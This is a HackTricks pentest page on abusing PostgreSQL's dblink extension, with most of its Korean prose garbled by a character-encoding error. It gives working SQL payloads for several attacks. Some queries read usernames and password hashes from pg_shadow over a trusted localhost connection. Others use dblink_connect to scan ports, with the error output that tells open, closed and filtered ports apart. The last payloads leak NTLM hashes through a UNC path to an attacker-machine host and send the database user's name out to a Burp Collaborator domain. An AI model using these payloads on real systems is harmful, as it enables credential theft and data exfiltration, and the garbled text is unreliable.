<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>


**ì´ëŸ¬í•œ ê³µê²©ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ì›ë³¸ ë…¼ë¬¸ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ([ì›ë³¸ ë…¼ë¬¸ì—ì„œ ë” ë§ì€ ì •ë³´ ì°¾ê¸°](http://www.leidecker.info/pgshell/Having\_Fun\_With\_PostgreSQL.txt)).

**PostgreSQL 9.1**ë¶€í„° ì¶”ê°€ ëª¨ë“ˆ ì„¤ì¹˜ê°€ ê°„ë‹¨í•´ì¡ŒìŠµë‹ˆë‹¤. [ë“±ë¡ëœ `dblink`ì™€ ê°™ì€ í™•ì¥ ê¸°ëŠ¥](https://www.postgresql.org/docs/current/contrib.html)ì€ [`CREATE EXTENSION`](https://www.postgresql.org/docs/current/sql-createextension.html)ì„ ì‚¬ìš©í•˜ì—¬ ì„¤ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```sql
CREATE EXTENSION dblink;
```
í•œ ë²ˆ dblinkë¥¼ ë¡œë“œí•˜ë©´ ëª‡ ê°€ì§€ í¥ë¯¸ë¡œìš´ íŠ¸ë¦­ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

## ê¶Œí•œ ìƒìŠ¹

`pg_hba.conf` íŒŒì¼ì€ **ë¹„ë°€ë²ˆí˜¸ë¥¼ ì•Œ í•„ìš” ì—†ì´** **ë¡œì»¬í˜¸ìŠ¤íŠ¸ì—ì„œ ëª¨ë“  ì‚¬ìš©ìë¡œì˜ ì—°ê²°ì„ í—ˆìš©**í•˜ëŠ” ì˜ëª»ëœ êµ¬ì„±ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ íŒŒì¼ì€ ì¼ë°˜ì ìœ¼ë¡œ `/etc/postgresql/12/main/pg_hba.conf`ì— ìœ„ì¹˜í•˜ë©°, ì˜ëª»ëœ êµ¬ì„±ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```
local    all    all    trust
```
_ì´ êµ¬ì„±ì€ ê´€ë¦¬ìê°€ ë¹„ë°€ë²ˆí˜¸ë¥¼ ìŠì–´ë²„ë ¸ì„ ë•Œ db ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ìˆ˜ì •í•˜ëŠ” ë° ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ë˜ë¯€ë¡œ ë•Œë¡œëŠ” ì´ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤._\
_ë˜í•œ pg\_hba.conf íŒŒì¼ì€ postgres ì‚¬ìš©ì ë° ê·¸ë£¹ì—ê²Œë§Œ ì½ê¸° ê°€ëŠ¥í•˜ê³  postgres ì‚¬ìš©ìì—ê²Œë§Œ ì“°ê¸° ê°€ëŠ¥í•©ë‹ˆë‹¤._

ì´ ê²½ìš°ëŠ” í”¼í•´ì ë‚´ë¶€ì— **ì´ë¯¸** ì‰˜ì´ ìˆëŠ” ê²½ìš°ì— ìœ ìš©í•˜ë©°, ì´ë¥¼ í†µí•´ postgresql ë°ì´í„°ë² ì´ìŠ¤ì— ì—°ê²°í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.

ë‹¤ë¥¸ ê°€ëŠ¥í•œ ì˜ëª»ëœ êµ¬ì„±ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```
host    all     all     127.0.0.1/32    trust
```
ë¡œì»¬í˜¸ìŠ¤íŠ¸ì—ì„œ ëª¨ë“  ì‚¬ìš©ìë¡œ ë°ì´í„°ë² ì´ìŠ¤ì— ì—°ê²°í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©ë˜ë¯€ë¡œ, ì´ ê²½ìš°ì—ëŠ” **`dblink`** í•¨ìˆ˜ê°€ **ì‘ë™**í•œë‹¤ë©´ ì´ë¯¸ ì„¤ì •ëœ ì—°ê²°ì„ í†µí•´ ë°ì´í„°ë² ì´ìŠ¤ì— ì—°ê²°í•˜ì—¬ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ì—†ì–´ì•¼ í•  ë°ì´í„°ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```sql
SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'SELECT datname FROM pg_database')
RETURNS (result TEXT);

SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'select usename, passwd from pg_shadow')
RETURNS (result1 TEXT, result2 TEXT);
```
## í¬íŠ¸ ìŠ¤ìºë‹

`dblink_connect`ë¥¼ ì•…ìš©í•˜ì—¬ **ì—´ë¦° í¬íŠ¸ë¥¼ ê²€ìƒ‰**í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ë§Œì•½ ê·¸ **í•¨ìˆ˜ê°€ ì‘ë™í•˜ì§€ ì•ŠëŠ”ë‹¤ë©´ `dblink_connect_u()`ë¥¼ ì‚¬ìš©í•´ë³´ì„¸ìš”**. ë¬¸ì„œì— ë”°ë¥´ë©´ `dblink_connect_u()`ëŠ” `dblink_connect()`ì™€ ë™ì¼í•˜ì§€ë§Œ, ë¹„ìŠˆí¼ìœ ì €ë„ ëª¨ë“  ì¸ì¦ ë°©ë²•ì„ ì‚¬ìš©í•˜ì—¬ ì—°ê²°í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•œë‹¤ê³  í•©ë‹ˆë‹¤.
```sql
SELECT * FROM dblink_connect('host=216.58.212.238
port=443
user=name
password=secret
dbname=abc
connect_timeout=10');
//Different response
// Port closed
RROR:  could not establish connection
DETAIL:  could not connect to server: Connection refused
Is the server running on host "127.0.0.1" and accepting
TCP/IP connections on port 4444?

// Port Filtered/Timeout
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTP server
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTPS server
ERROR:  could not establish connection
DETAIL:  received invalid response to SSL negotiation:
```
ë‹¤ìŒì„ ì‹¤í–‰í•˜ê¸° ì „ì— `dblink_connect` ë˜ëŠ” `dblink_connect_u`ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆì–´ì•¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```
CREATE extension dblink;
```
## UNC ê²½ë¡œ - NTLM í•´ì‹œ ë…¸ì¶œ

When an attacker gains access to a user's NTLM hash, they can use it to authenticate themselves as that user on other systems that use NTLM authentication. One way to obtain the NTLM hash is through the disclosure of UNC paths.

UNC (Universal Naming Convention) paths are used to access shared resources on a network. They follow the format `\\server\share\file`. In some cases, when a user accesses a UNC path, their NTLM hash is automatically sent to the server hosting the shared resource.

To exploit this, an attacker can set up a malicious server and create a UNC path that points to it. When the targeted user accesses this UNC path, their NTLM hash will be sent to the attacker's server, allowing them to capture it.

To detect if a UNC path is disclosing NTLM hashes, you can use a port scanner to check if the server hosting the shared resource is listening on port 445 (SMB). If it is, there is a possibility that the UNC path is vulnerable to NTLM hash disclosure.

To prevent NTLM hash disclosure through UNC paths, it is recommended to disable NTLM authentication and use more secure authentication mechanisms such as Kerberos. Additionally, ensure that your systems are up to date with the latest security patches to mitigate any known vulnerabilities.
```sql
-- can be used to leak hashes to Responder/equivalent
CREATE TABLE test();
COPY test FROM E'\\\\attacker-machine\\footestbar.txt';
```

```sql
-- to extract the value of user and send it to Burp Collaborator
CREATE TABLE test(retval text);
CREATE OR REPLACE FUNCTION testfunc() RETURNS VOID AS $$
DECLARE sqlstring TEXT;
DECLARE userval TEXT;
BEGIN
SELECT INTO userval (SELECT user);
sqlstring := E'COPY test(retval) FROM E\'\\\\\\\\'||userval||E'.xxxx.burpcollaborator.net\\\\test.txt\'';
EXECUTE sqlstring;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT testfunc();
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ë°** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— ì œì¶œí•˜ì„¸ìš”.**

</details>
